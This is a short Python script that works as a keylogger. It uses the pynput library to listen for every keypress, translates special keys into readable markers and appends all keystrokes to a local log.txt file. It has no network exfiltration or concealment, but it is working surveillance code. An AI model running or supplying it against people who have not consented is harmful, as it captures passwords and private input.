#   Storing the keystrokes in a text file :)
from pynput.keyboard import Listener

special_keys = {
    'Key.space' : ' ',
    'ctrl': '',
    'Key.shift': '',
    'Key.shift_r': '',
    'Key.Shift_L': '',
    'Key.ctrl': '',
    'Key.control_l': '',
    'Key.ctrl_l': '',
    'Key.ctrl_r': '',
    'Key.control_r': '',
    'Key.enter': '\n',
    'Key.backspace': '[BACKSPACE]',  # Puedes gestionar el retroceso si lo necesitas
    'Key.tab': '\t',
    'Key.esc': '[ESC]',
    'Key.delete': '[DEL]',
    'Key.up': '[UP]',
    'Key.down': '[DOWN]',
    'Key.left': '[LEFT]',
    'Key.right': '[RIGHT]',
    'Key.alt': ''

}

def write_to_file(key):
    key_str = str(key)
    letter = special_keys.get(key_str, key_str.replace("'", ""))

    with open("log.txt", 'a') as f: # open in 'a' = append mode
        f.write(letter)


with Listener(on_press=write_to_file) as l:
    l.join()




#   Release memory to not colapse resources  de "with" keyword release memory automatically   